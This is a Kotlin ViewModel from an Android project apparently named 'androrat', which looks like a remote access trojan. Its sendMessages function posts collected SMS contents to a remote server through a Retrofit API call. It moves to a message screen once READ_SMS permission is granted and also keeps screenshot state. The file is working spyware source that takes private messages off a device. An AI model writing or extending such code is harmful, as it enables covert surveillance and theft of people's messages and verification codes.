package com.ierusalem.androrat.screens.home

import android.Manifest
import android.content.Context
import android.util.Log
import androidx.compose.runtime.Immutable
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.ui.graphics.ImageBitmap
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.ierusalem.androrat.networking.RetrofitInstance
import com.ierusalem.androrat.networking.SMSModel
import com.ierusalem.androrat.ui.navigation.DefaultNavigationEventDelegate
import com.ierusalem.androrat.ui.navigation.NavigationEventDelegate
import com.ierusalem.androrat.ui.navigation.emitNavigation
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch

class HomeViewModel : ViewModel(),
    NavigationEventDelegate<HomeScreenNavigation> by DefaultNavigationEventDelegate() {

    private var _state: MutableStateFlow<HomeScreenState> = MutableStateFlow(HomeScreenState())
    val state = _state.asStateFlow()

    val visiblePermissionDialogQueue = mutableStateListOf<String>()

    fun sendMessages(messages: String, context: Context){
        Log.d("ahi3646_messageJson", "sendMessages: $messages ")
        val apiService = RetrofitInstance(context).api
        viewModelScope.launch {
            try {
                val response = apiService.postFiles(SMSModel(messages))
                if (response.isSuccessful) {
                    Log.d("ahi3646_view_model", "sendMessages: success ")
                }else{
                    Log.d("ahi3646_view_model", "sendMessages: failure ")
                }
            } catch (e: Exception) {
                Log.d("ahi3646_view_model", "sendMessages: exception ${e.localizedMessage} ")
                // Handle errors here
            }
        }
    }

    fun dismissDialog() {
        visiblePermissionDialogQueue.removeFirst()
    }

    fun onPermissionResult(
        permission: String,
        isGranted: Boolean
    ) {
        if (!isGranted && !visiblePermissionDialogQueue.contains(permission)) {
            visiblePermissionDialogQueue.add(permission)
        }
        if (isGranted && permission == Manifest.permission.READ_SMS){
            emitNavigation(HomeScreenNavigation.OpenMessageFragment)
        }
    }

    fun updatePhoto(bitmap: ImageBitmap) {
        _state.update {
            it.copy(
                screenshot = bitmap
            )
        }
    }

}

@Immutable
data class HomeScreenState(
    val screenshot: ImageBitmap? = null
)